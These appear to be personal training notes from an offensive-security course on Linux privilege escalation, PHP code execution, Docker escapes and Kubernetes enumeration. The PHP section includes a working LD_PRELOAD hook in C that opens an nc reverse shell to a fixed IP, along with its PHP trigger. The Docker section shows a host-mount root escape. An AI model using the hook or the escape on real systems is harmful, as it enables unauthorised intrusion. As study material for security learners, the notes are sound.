---
tags:
  - trainings
  - blackhat
category:
---
# Internal Linux

## Shell Escapes

![[Pasted image 20260802112935.png]]

### Restricted Shells

Shell access can be further restricted using restricted shells

* rbash
	* rbash: It prevents direct usage of the '/' character in commands, yet execution proceeds if the command exists in the user's path
* lbash
	* It performs command parsing and is hence vulnerable to logic bugs

### Elevation Options

#### GTFOBins

List of binaries to bypass local security protections
Inspired by the LOLBins project on Windows

Binaries can be used to perform a wide range of actions:

* Interactive execute
* Non-interactive reverse shell
* Non-interactive bind shell
* File write
* File read
* Sudo
* Limited SUID

## File Permissions

![[Pasted image 20260802113325.png]]

### SUID Files

Executes with the uid of the owner of the file(s), not with the permission of the user executing it

How to create a SUID & SGID file

```bash
chmod 6755 test.txt
```

Searching for SUID & SGID files

```bash
find / \(-perm -4000 -o -perm -2000\) -type f 2>/dev/null
```

### Environment Variables

A useful feature and a source of many issues

* BASH
	* The full pathname used to execute the current instance of Bash
* BASH_ALIAS
	* An associative array variable whose members correspond to the internal list of aliases as maintained by the alias built-in
* BASH_ENV
	* Used when Bash is invoked to execute a shell script, its value is expanded and used as the name of a start-up file to read before executing the script
* PATH
	* It specifies the directories to be searched to find a command
* LD_PRELOAD
	* A list of additional, user-specified, ELF-shared objects to be loaded before all others
* LD_AUDIT
	* A list of additional shared libraries that implement the auditing API

## Shell Wildcards

![[Pasted image 20260802113800.png]]

* An asterisk matches any number of characters
* The question mark matches any single character
* Brackets enclose a set of characters
* A hyphen used with brackets denotes a range of characters
* Tilde at the beginning of a word expands to the name of the user's home directory

> [!WARNING] In file names, (-) can be read as CLI arguments by Shell Wildcards

# Server Hardening

## AppArmor

A path based Mandatory Access Control (MAC) system to restrict programs to a limited set of resources
Enforces access control rules on programs rather than users
2 modes of Access Control Enforcement
	Enforcement
	Complain
Profiles are stored in the /etc/apparmor.d/ and are loaded into the kernel at boot time
Path-based restrictions can often be bypassed by simply moving the binary locations

Check the status

```bash
aa-status
```

List AppArmor confined executables

```bash
ps axZ | grep -v '^unconfined'
```

## PHP

Various PHP functions can be used for code execution

* exec
* system
* passthru
* popen
* shell_exec
* proc_open
* dl
* pcntl_exec

The `putenv` function allows PHP to set environment variables
LD_PRELOAD environment variable allows
	Dynamic library loading to override function calls
	Useful to override specific features and obtain better control over the application


The PHP mail function in Unix spawns a new process on arguments
	We can use this to get a shell

*hook.c*
```c
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
int geteuid() {
        if (getenv("LD_PRELOAD") == NULL) {
                return 0;

        }
        unsetenv("LD_PRELOAD");
        system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.13.206 8443 >/tmp/f");
}
```

Compile shared objects

```bash
gcc --shared -fPIC hook.c -o hook.so
```

PHP code to run the hook

```php
<?php
putenv("LD_PRELOAD=hook.so");
mail("a","a","a","a");
?>
```

# Privilege Escalation

![[Pasted image 20260802115108.png]]

## Docker

Removes the “It works on my System” syndrome
Easy & quick to set up environments and test beds
Loved by start-ups and PoC development teams
Loved by Google and liked for scalability and deployment ease
As secure as you configure it

Docker normally runs as a service with elevated privileges (YAY!)
A Docker image is downloaded from a public hub (Docker Hub) or a private hub
The image is provided with a set of options and executed as a container
The image may expose ports to other containers or the external network
Docker provides an internal network for all containers on the same host
### Container vs Virtual Machine

**In VM hypervisor is used to host kernels of different operating systems, allowing the host to run multiple operating systems like Linux and Windows**

**In Docker containers, all the operating systems share the same kernel, restricting the Linux host to run only Linux-based operating systems like Ubuntu, CentOS, Red-hat, etc**

![[Pasted image 20260802115458.png]]

### Architecture

![[Pasted image 20260802115627.png]]

### Registries

**You can host your own Registry**
* Selfhost, Amazon ECR and Google Container Registry are some options

**Write Access to the Registry will allow planting backdoors**
* Pull a Docker image from the registry
* Update the image with the backdoor
* Upload back to the container registry
* Wait for the image to be used next time

Docker supports multiple storage drivers, but most modern Linux kernels support the Overlay2 file system
A new container adds a new & thin writable layer on top of the underlying stack of layers present in the Docker image
Docker images are immutable, and the changes made to the writable layer are ephemeral

![[Pasted image 20260802115931.png]]

### Docker Internals

**Namespaces**
* Provides an isolated workspace called the container
* Docker creates a set of namespaces for each ran container
**Cgroups**
* Also called `Control Groups`
* Allocate CPU time, system memory, network bandwidth, or a combination
* Among user-defined groups of tasks for the docker container
**Chroot**
* Jailing allows you to run a program (process) with a root directory other than the actual root directory (/)
**Kernel Capabilities**
* Turn the binary "root/non-root" dichotomy into a fine-grained access control system

### Kernel Capabilities

Traditional Unix implementations implement two categories of processes
* Privileged
* Unprivileged

With Kernel Capabilities we can split up permissions instead of having to have root permissions

**CAP_CHOWN** - Change file owners
**CAP_NET_RAW** - Open raw and packet sockets
**CAP_SETFCAP** - Set arbitrary capabilities on a file
**CAP_AUDIT_WRITE** - Write to kernel audit log
**CAP_DAC_OVERRIDE** - Bypass file read, write, and execute permission checks
**CAP_AUDIT_CONTROL** - Toggle kernel auditing
**CAP_NET_BIND_SERVICE** - Bind a socket in privileged ports
**CAP_SETUID/CAP_SETGID** - Change UID/GID

List capabilities

```bash
getcap -r 2>/dev/null
```

Set capabilities

```bash
setcap cap_setuid+ep /path/to/file
```

Remove capabilities

```bash
setcap -r /path/to/file
```

### Attacking Docker


By default, host UID == container UID
Root in container == root on the base box (if the container is running with --privilege)
If a file system is shared, you may have a direct path to get the root

```bash
docker run -itv /:/host alpine /bin/sh

	i: interactive
	t: allocate a pseudo TTY
	v: bind mount a directory
```

Inside the container, you can access the files in the ‘/host’ or use chroot

```bash
chroot /host
```

#### Exposing the Docker Socket

Docker socket == access to Docker daemon
Docker could listen on port 2375 (noauth) or 2376 (TLS)
Generally: Dashboard or reporting application containers
Misconfiguration, (un)intended exposure == compromise

![[Pasted image 20260802121255.png]]

#### Unpatched Host/Guest

Docker shares the kernel with the host
Kernel bugs/exploits could result in host compromise

#### Rogue Kernel Module

As the kernel is shared between Docker and the host, the kernel module attacks the host
A reverse shell can be obtained by loading custom kernel modules
*Need root access on the Docker container*

##### Kernel Module Structure

https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host
https://xcellerator.github.io/posts/linux_rootkits_03/

![[Pasted image 20260802121524.png]]

![[Pasted image 20260802121536.png]]

![[Pasted image 20260802121547.png]]

![[Pasted image 20260802121555.png]]

## Kubernetes

Open-Source System for automating deployment, scaling and management of containerized applications

![[Pasted image 20260802122132.png]]

### Basics

**Pod** - A group of containers, co-located on the same host
**Labels** - Labels for identifying pods
**Kubelet** - Container agent
**Proxy** - A load balancer for pods
**etcd** - Metadata service (key-value store)
**Replication Controller** - Manage replication of pods

### Controller Node

**kube-apiserver**
* The Kubernetes API server validates and configures data for the API objects like pods, services, etc. and acts as a frontend to the cluster's shared state through which all other components interact

**etcd**
* Consistent and highly available key-value store used as Kubernetes' backing store for all cluster data

**kube-scheduler**
* Assigns a node for the newly created pods

**kube-controller-manager**
* Controls the state of the cluster. Logically, controllers are separate processes but are compiled into a single binary

**cloud-controller-manager**
* The cloud controller manager lets you link your cluster to your cloud provider's API

### Worker Node Components

**kubelet**
* kubelet is an agent that runs on each node in the cluster. It makes sure that containers are running in a Pod

**kube-proxy**
* kube-proxy is a network proxy that runs on each node in your cluster. kube-proxy maintains network rules on nodes. These network rules allow network communication to your Pods from network sessions inside or outside of your cluster

**container runtime**
* The container runtime is the software that is responsible for running containers on each node

### Ports

| Port          | Description                                    |
| ------------- | ---------------------------------------------- |
| 6443          | Kubernetes API server (Controller Node Only)   |
| 2379 - 2380   | etcd server client API (Controller Node Only)  |
| 10250         | Kubelet API                                    |
| 10251         | kube-scheduler (Controller Node Only)          |
| 10252         | kube-controller-manager (Controller Node Only) |
| 10255         | Read-Only Kubelet API                          |
| 30000 - 32767 | NodePort services (Client Only)                |

### kubectl

The kubectl command-line tool lets you control Kubernetes clusters

For configuration, kubectl looks for a file named config in the $HOME/.kube directory
You can specify other kubeconfig files by setting the KUBECONFIG environment variable or by setting the `--kubeconfig` flag

Kubectl Examples

```bash
kubectl run <pod> --image=<image>
kubectl get pod
kubectl describe pod
kubectl apply -f <deployment-file.yaml>
```

### Enumeration

Create your own kube node

```bash
kubectl create -f test.yml
```

Execute code or run shell from a specific container

```bash
kubectl exec <pod> -c <container> -i -r -- <shell>
```

Copy files and directories to and from containers

```bash
kubectl cp <namespace>/<pod>:/tmp/foo /tmp/bar
```

Create and run the nginx image in a pod

```bash
kubectl run nginx --image=nginx
```

Practice kubernetes at https://kubernetes.io/

### Exposure

**External**
* Controller node, Nodes, Apps
**Internal**
* Service accounts, pod network, service network, volumes, configs & secrets, env variables
**Cloud Environment**
* Metadata APIs, IAM privileges, container registries, storage

Identify a list of running pods using the API

```bash
curl –sk https://192.168.99.101:10250/runningpods/ | python –m json.tool
```

Identify if the token is accessible

```bash
ls -al /var/run/secrets/kuberenetes.io/serviceaccount/token
```

View exposed application metrics

```bash
curl 192.168.100.6:10249/metrics
```

**Pods**
* Service account privilege enumeration
* Kernel exploits
* Container security configuration
* Sensitive data exposure
**Network**
* Ports exposed on the pod network
* Ports exposed on the service network
**Other Targets**
* Configs
* Secrets
* Volumes
* Environment variables
* Vulnerable versions of Kubernetes components

# Credential Extraction

